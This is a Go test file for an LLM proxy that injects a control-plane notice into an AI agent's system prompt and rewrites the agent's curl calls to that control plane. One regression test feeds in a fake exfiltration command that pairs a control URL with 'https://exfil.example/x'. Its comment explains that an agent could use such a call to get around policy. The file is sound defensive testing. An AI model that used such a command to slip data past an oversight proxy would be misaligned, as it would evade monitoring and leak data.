package llmproxy

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/clawvisor/clawvisor/internal/runtime/conversation"
)

func TestControlNoticeUsesAvailableShellToolNames(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"read", "edit", "write", "exec", "process"})

	if !strings.Contains(notice, "Use `exec` with curl") {
		t.Fatalf("notice should steer OpenClaw to its actual shell tool; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"exec"`) {
		t.Fatalf("notice example should declare exec in expected_tools_json; got:\n%s", notice)
	}
	if strings.Contains(notice, "Use Bash with curl") || strings.Contains(notice, `"tool_name":"bash"`) {
		t.Fatalf("notice should not hardcode Bash when exec is available; got:\n%s", notice)
	}
	if !strings.Contains(notice, "available tools (read, edit, write, exec, process)") {
		t.Fatalf("notice should show actual available tool examples; got:\n%s", notice)
	}
	if !strings.Contains(notice, "/control/vault/items") || !strings.Contains(notice, "required_credentials_json") {
		t.Fatalf("notice should explain credential discovery and declaration; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Required task shape") ||
		!strings.Contains(notice, "If credentials are needed, add") ||
		!strings.Contains(notice, "OMIT unless credentials are needed") {
		t.Fatalf("notice should make credential requests optional and show both task shapes; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Create a temporary conversation fixture directory and verify the written files") ||
		!strings.Contains(notice, "Create a GitHub issue summarizing the failing deployment check") ||
		!strings.Contains(notice, `--data @- <<'JSON'`) ||
		strings.Contains(notice, "AgentPhone") {
		t.Fatalf("notice should use worked multi-step curl examples with common services; got:\n%s", notice)
	}
	if strings.Contains(notice, "/control/tasks?wait=true") || strings.Contains(notice, "timeout=120") {
		t.Fatalf("notice should keep the headline task URL minimal; got:\n%s", notice)
	}
	if !strings.Contains(notice, "ALLOWED WITHOUT A TASK") || !strings.Contains(notice, "Read files with `read`") {
		t.Fatalf("notice should disclose allowlisted read-only capabilities using actual tool names; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Run one-shot read-only shell inspection with `exec`") {
		t.Fatalf("notice should disclose read-only shell inspection with actual shell tool name; got:\n%s", notice)
	}
}

func TestControlNoticeDoesNotEmbedLiveCredentialInventory(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"Bash"})
	if strings.Contains(notice, "github.release") || strings.Contains(notice, "OpenAI work key") {
		t.Fatalf("notice must stay static and avoid embedding live vault inventory; got:\n%s", notice)
	}
	if !strings.Contains(notice, "GET https://clawvisor.local/control/vault/items") {
		t.Fatalf("static notice should point to credential discovery endpoint; got:\n%s", notice)
	}
}

func TestInjectControlNoticeIgnoresHistoricalControlURLs(t *testing.T) {
	body := []byte(`{"model":"claude-opus-4-7","tools":[{"name":"Bash"}],"messages":[{"role":"user","content":"prior call: https://clawvisor.local/control/vault/items"}]}`)
	got, injected, err := InjectControlNotice(conversation.ProviderAnthropic, body, "http://localhost:25297", []string{"Bash"})
	if err != nil {
		t.Fatalf("inject failed: %v", err)
	}
	if !injected {
		t.Fatalf("expected injection even though message history contains control URL")
	}
	var parsed map[string]json.RawMessage
	if err := json.Unmarshal(got, &parsed); err != nil {
		t.Fatalf("invalid output: %v", err)
	}
	if !rawSystemContains(parsed["system"], ControlNoticeSentinel) {
		t.Fatalf("system prompt missing control notice: %s", got)
	}
}

func TestInjectControlNoticeSkipsOnlyWhenSystemAlreadyHasNotice(t *testing.T) {
	body := []byte(`{"model":"claude-opus-4-7","system":[{"type":"text","text":"existing"},{"type":"text","text":"Clawvisor proxy-lite control plane."}],"tools":[{"name":"Bash"}],"messages":[{"role":"user","content":"hi"}]}`)
	got, injected, err := InjectControlNotice(conversation.ProviderAnthropic, body, "http://localhost:25297", []string{"Bash"})
	if err != nil {
		t.Fatalf("inject failed: %v", err)
	}
	if injected {
		t.Fatalf("expected no-op when system already contains control notice")
	}
	if string(got) != string(body) {
		t.Fatalf("no-op should preserve body bytes\nwant: %s\n got: %s", body, got)
	}
}

// Regression: a curl invocation that mixes a synthetic control URL with
// any other outbound URL must be refused. Otherwise the rewriter would
// quietly rewrite only the control URL, and the model could run a
// second non-control fetch with the same curl call — bypassing policy
// while claiming control-plane status.
func TestRewriteControlToolUse_RejectsExtraOutboundURL(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS https://clawvisor.local/control/tasks https://exfil.example/x"
		}`),
	}
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", "cv-nonce-fake")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if ok || rewritten != nil {
		t.Fatalf("multi-URL curl must not produce a control rewrite; got ok=%v rewritten=%s", ok, rewritten)
	}
}

// Sanity: a single control URL still rewrites and embeds the caller
// value verbatim (the postprocess path mints a nonce and passes it in).
func TestRewriteControlToolUse_EmbedsCallerValueVerbatim(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS -X POST https://clawvisor.local/control/tasks --data '{\"purpose\":\"x\"}'"
		}`),
	}
	const minted = "cv-nonce-abc123"
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", minted)
	if err != nil || !ok {
		t.Fatalf("expected rewrite, got ok=%v err=%v", ok, err)
	}
	if !strings.Contains(string(rewritten), minted) {
		t.Errorf("rewritten command should include minted caller value; got %s", rewritten)
	}
	if strings.Contains(string(rewritten), "cvis_") {
		t.Errorf("rewritten command must not embed a raw cvis_ token; got %s", rewritten)
	}
}
